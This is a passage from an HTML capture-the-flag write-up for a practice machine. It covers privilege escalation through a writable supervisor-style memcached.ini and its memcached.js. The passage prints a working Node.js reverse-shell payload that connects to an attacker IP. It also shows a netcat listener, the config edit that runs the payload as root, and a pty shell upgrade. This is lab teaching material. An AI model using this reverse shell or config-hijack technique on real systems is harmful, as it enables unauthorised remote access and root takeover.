+                |&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;__&nbsp;_&nbsp;&nbsp;&nbsp;/&nbsp;___|__&nbsp;_&nbsp;___&nbsp;&nbsp;__&nbsp;_&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;\&nbsp;&nbsp;___&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;\&nbsp;__&nbsp;_&nbsp;_&nbsp;__&nbsp;&nbsp;&nbsp;___|&nbsp;|<br>
+                |&nbsp;|&nbsp;&nbsp;&nbsp;/&nbsp;_`&nbsp;|&nbsp;|&nbsp;|&nbsp;&nbsp;&nbsp;/&nbsp;_`&nbsp;/&nbsp;__|/&nbsp;_`&nbsp;|&nbsp;|&nbsp;|&nbsp;|&nbsp;|/&nbsp;_&nbsp;\&nbsp;|&nbsp;|_)&nbsp;/&nbsp;_`&nbsp;|&nbsp;'_&nbsp;\&nbsp;/&nbsp;_&nbsp;\&nbsp;|<br>
+                |&nbsp;|__|&nbsp;(_|&nbsp;|&nbsp;|&nbsp;|__|&nbsp;(_|&nbsp;\__&nbsp;\&nbsp;(_|&nbsp;|&nbsp;|&nbsp;|_|&nbsp;|&nbsp;&nbsp;__/&nbsp;|&nbsp;&nbsp;__/&nbsp;(_|&nbsp;|&nbsp;|_)&nbsp;|&nbsp;&nbsp;__/&nbsp;|<br>
+                |_____\__,_|&nbsp;&nbsp;\____\__,_|___/\__,_|&nbsp;|____/&nbsp;\___|&nbsp;|_|&nbsp;&nbsp;&nbsp;\__,_|&nbsp;.__/&nbsp;\___|_|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                lacasadepapel&nbsp;[~]$&nbsp;id<br>
+                uid=1002(professor)&nbsp;gid=1002(professor)&nbsp;groups=1002(professor)
+            </div>
+        </div><br>
+        <br>
+        We have a shell!<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>9) memcached</strong></h2><br>
+        In <code>/home/professor</code> we find a set of files named memcached.<br>
+            <div class="codebox">
+                lacasadepapel&nbsp;[~]$&nbsp;ls<br>
+                memcached.ini&nbsp;&nbsp;memcached.js&nbsp;&nbsp;&nbsp;node_modules<br>
+                lacasadepapel&nbsp;[~]$&nbsp;ls&nbsp;-l<br>
+                total&nbsp;12<br>
+                -rw-r--r--&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;88&nbsp;Jan&nbsp;29&nbsp;01:25&nbsp;memcached.ini<br>
+                -rw-r-----&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nobody&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;434&nbsp;Jan&nbsp;29&nbsp;01:24&nbsp;memcached.js<br>
+                drwxr-sr-x&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;professo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jan&nbsp;29&nbsp;01:31&nbsp;node_modules
+            </div>
+        </div><br>
+        <br>
+        We can't read <code>memcached.js</code> but <code>memcached.ini</code> we can read.<br>
+        <code>memcached.ini</code> looks like it runs our <code>memcached.js</code> file by running the <code>node</code> command as user <code>nobody</code>.<br>
+            <div class="codebox">
+                lacasadepapel&nbsp;[~]$&nbsp;cat&nbsp;memcached.js<br>
+                cat:&nbsp;can't&nbsp;open&nbsp;'memcached.js':&nbsp;Permission&nbsp;denied<br>
+                lacasadepapel&nbsp;[~]$&nbsp;cat&nbsp;memcached.ini<br>
+                [program:memcached]<br>
+                command&nbsp;=&nbsp;sudo&nbsp;-u&nbsp;nobody&nbsp;/usr/bin/node&nbsp;/home/professor/memcached.js
+            </div>
+        </div><br>
+        <br>
+        Despite what the file permissions look like, you can still <code>mv</code> this file.<br>
+        As a result, you can create your own <code>memcached.js</code> file and put whatever javascript code in it you like.<br>
+        This should get us code execution as the user <code>nobody</code>.<br>
+        You can't write bash because <code>memcached.ini</code> is running <code>/usr/bin/node &lt;command&gt;</code>, not <code>/bin/bash &lt;command&gt;</code>.<br>
+        <br>
+        I created a backup of <code>memcached.js</code> and then wrote a reverse shell version of <code>memcached.js</code> using the code provided here - <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell">https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell</a><br>
+            <div class="codebox">
+                lacasadepapel&nbsp;[~]$&nbsp;mv&nbsp;memcached.js&nbsp;memcached.js.bku<br>
+                lacasadepapel&nbsp;[~]$&nbsp;ls<br>
+                memcached.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcached.js.bku&nbsp;&nbsp;node_modules<br>
+                lacasadepapel&nbsp;[~]$&nbsp;vi&nbsp;memcached.js<br>
+                (function(){<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;net&nbsp;=&nbsp;require("net"),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;=&nbsp;require("child_process"),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh&nbsp;=&nbsp;cp.spawn("/bin/sh",&nbsp;[]);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;client&nbsp;=&nbsp;new&nbsp;net.Socket();<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;client.connect(9001,&nbsp;"10.10.14.7",&nbsp;function(){<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.pipe(sh.stdin);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stdout.pipe(client);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stderr.pipe(client);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;/a/;&nbsp;//&nbsp;Prevents&nbsp;the&nbsp;Node.js&nbsp;application&nbsp;form&nbsp;crashing<br>
+                })();<br>
+                lacasadepapel&nbsp;[~]$&nbsp;ls<br>
+                memcached.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcached.js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcached.js.bku&nbsp;&nbsp;node_modules
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine and you should receive a shell from <code>nobody</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.131]&nbsp;46068<br>
+                whoami<br>
+                nobody<br>
+                ls<br>
+                bin<br>
+                boot<br>
+                dev<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        But a shell from <code>nobody</code> isn't ideal :/<br>
+        A shell from <code>root</code> would be preferred.<br>
+        <br>
+        Using the same logic as before, you can modify <code>memcached.ini</code> and have your command run as <code>root</code>.<br>
+        <br>
+        I made a backup of <code>memcached.ini</code> and wrote my own version of the file that ran <code>/usr/bin/node</code> as <code>root</code>.<br>
+            <div class="codebox">
+                lacasadepapel&nbsp;[~]$&nbsp;mv&nbsp;memcached.ini&nbsp;memcached.ini.bku<br>
+                lacasadepapel&nbsp;[~]$&nbsp;vi&nbsp;memcached.ini<br>
+                [program:memcached]<br>
+                command&nbsp;=&nbsp;sudo&nbsp;-u&nbsp;root&nbsp;/usr/bin/node&nbsp;/home/professor/memcached.js<br>
+                lacasadepapel&nbsp;[~]$&nbsp;ls<br>
+                memcached.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcached.ini.bku&nbsp;&nbsp;memcached.js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcached.js.bku&nbsp;&nbsp;&nbsp;node_modules
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine and you should get a shell back as root!<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.131]&nbsp;46086<br>
+                whoami<br>
+                root<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                bash-4.4#&nbsp;cd&nbsp;~<br>
+                cd&nbsp;~<br>
+                bash-4.4#&nbsp;cat&nbsp;root.txt<br>
+                cat&nbsp;root.txt<br>
+                5869....
+            </div>
+        </div><br>
+        <br>
+        We're done!<br>
+    </writeup>
+</section>
+
+</body>
+</html>
